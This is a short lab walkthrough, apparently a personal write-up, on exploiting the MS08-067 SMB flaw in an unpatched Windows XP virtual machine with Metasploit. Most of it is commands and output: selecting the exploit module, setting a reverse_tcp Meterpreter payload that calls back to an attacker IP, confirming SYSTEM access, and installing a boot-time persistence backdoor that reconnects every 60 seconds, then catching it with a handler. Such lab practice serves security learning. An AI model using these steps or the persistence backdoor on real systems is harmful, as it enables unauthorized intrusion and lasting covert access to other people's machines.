# Exploiting Windows XP with Metasploit (MS08-067) and Persistence

## Vulnerability
Windows XP is vulnerable to **MS08-067 (NetAPI)**, a critical SMB vulnerability that allows **remote code execution** without authentication.
Due to the lack of modern protections (ASLR, strong DEP), exploitation reliably yields a **SYSTEM-level shell**.

---

## Lab Environment

- Attacker: Kali Linux
- Victim: Windows XP (unpatched)
- Tool: Metasploit Framework
- Network: Same subnet (NAT / Host-only)

---

## Exploit Discovery

```bash
msfconsole
search ms08_067

exploit/windows/smb/ms08_067_netapi
```

## Exploitation

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.0.105
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.0.10
exploit

Meterpreter session 1 opened
```

The exploit triggers a buffer overflow in the SMB service and spawns a Meterpreter session with SYSTEM privileges.

## Post-Exploitation Verification

```bash
meterpreter > sysinfo
meterpreter > getuid

NT AUTHORITY\SYSTEM
```

## Persistence
To maintain access after reboot, a persistent backdoor is installed.

```bash
meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.0.10
```
-X → start on system boot
-i 60 → reconnect every 60 seconds
-p 4444 → listening port
-r → attacker IP

## Persistence Verification
After rebooting the Windows XP machine:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.0.10
set LPORT 4444
exploit

Meterpreter session opened
```
The session reconnects automatically, confirming successful persistence.